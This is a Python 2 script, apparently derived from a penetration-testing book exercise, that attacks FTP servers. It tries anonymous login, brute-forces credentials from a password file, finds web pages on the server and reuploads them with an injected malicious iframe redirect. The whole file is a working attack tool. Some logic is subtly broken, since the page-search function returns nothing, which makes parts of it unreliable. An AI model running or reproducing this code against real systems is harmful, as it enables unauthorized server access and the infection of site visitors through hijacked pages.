__author__ = 'derog'

import ftplib
import optparse

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous','such@fake.com')
        print '\n[*] ' + str(hostname) + ' FTP Anonymous Login Succeeded.'
        ftp.quit()
        return True
    except Exception, e:
        print '\n [-] ' + str(hostname) + ' FTP Anonymous Login Failed'
        return False

def bruteLogin(hostname, passwdFile):
    pf = open(passwdFile,'r')
    for line in pf.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print '[*] Trying: '+ username + '/' + password
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username,password)
            print '[+] Login Succeded: '+ username + '/' +password
            ftp.quit()
            return (username, password)
        except Exception, e:
            pass
    print '\n[-] Brute Force did not break FTP credentials'
    return (None,None)

def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
        print '[*] Searching for Web Pages'
    except:
        dirList =[]
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'
        return
    retList = []
    for filename in dirList:
        fn=filename.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Found default page: ' + filename
            retList.append(filename)

def injectPage(ftp, page, redirect):
    f = open(page + '.tmp','w')
    ftp.retrlines('RETR ' +page, f.write)
    print '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: '+ page
    ftp.storlines('STOR '+ page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: '+page

def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp,defPage,redirect)

def main():
    parser = optparse.OptionParser('usage%prog '+'-H <target host[s]> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H',dest='tgtHosts',type='string',help='specify target host')
    parser.add_option('-f',dest='passwdFile',type='string',help='specify user/password file')
    parser.add_option('-r',dest='redirect',type='string',help='specify a redirection page')
    (options, args)=parser.parse_args()
    tgtHosts = str(options.tgtHosts).split(',')
    passwdFile = options.passwdFile
    redirect = options.redirect
    if tgtHosts == None or redirect == None:
        print parser.usage
        exit(0)
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'sux@fake.com'
            print '[+] Using Anonymous Credentials to Attack'
            attack(username,password,tgtHost,redirect)
        elif passwdFile != None:
            (username, password) = bruteLogin(tgtHost, passwdFile)
        if password != None:
            print '[+] Using Creds: ' + username +'/'+password + 'to attack'
            attack(username,password,tgtHost,redirect)

if __name__=="__main__":
    main()